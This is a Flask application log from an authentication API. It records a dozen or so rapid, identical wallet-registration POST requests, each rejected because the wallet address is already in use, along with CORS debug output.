2025-07-09 10:55:19,419 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:19,419 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:19,419 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:19,419 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:19,590 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:19,590 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:19,590 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:19,590 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:19,590 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:19,594 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:19,594 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:19,594 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:19,595 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:19,595 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:19,748 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:19,748 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:19,748 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:19,748 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:19,748 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:19,755 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:19,755 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:19,755 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:19,755 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:19,756 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:19,915 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:19,915 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:19,915 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:19,915 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:19,915 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:19,919 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:19,920 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:19,920 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:19,920 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:19,920 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:20,073 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:20,073 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:20,073 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:20,073 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:20,073 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:20,078 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:20,079 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:20,079 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:20,079 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:20,079 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:20,199 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:20,199 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:20,199 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:20,199 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:20,200 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:20,205 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:20,206 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:20,206 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:20,206 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:20,206 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:20,328 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:20,328 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:20,328 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:20,328 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:20,328 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:20,333 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:20,334 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:20,334 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:20,334 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:20,334 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:20,474 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:20,474 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:20,474 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:20,474 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:20,474 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:20,478 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:20,478 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:20,478 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:20,478 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:20,478 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:20,632 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:20,633 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:20,633 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:20,633 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:20,633 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:20,638 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:20,639 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:20,639 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:20,639 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:20,639 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:20,763 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:20,763 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:20,764 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:20,764 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:20,764 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:20,771 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:20,771 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:20,771 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:20,771 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:20,771 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:20,908 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:20,908 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:20,908 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:20,908 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:20,908 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:20,912 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:20,912 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:20,912 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:20,913 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:20,913 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:21,081 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:21,081 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:21,082 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:21,082 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:21,082 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:21,087 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:21,087 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:21,087 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:21,087 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:21,087 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:21,210 - api.auth - INFO - Received register request with method: POST
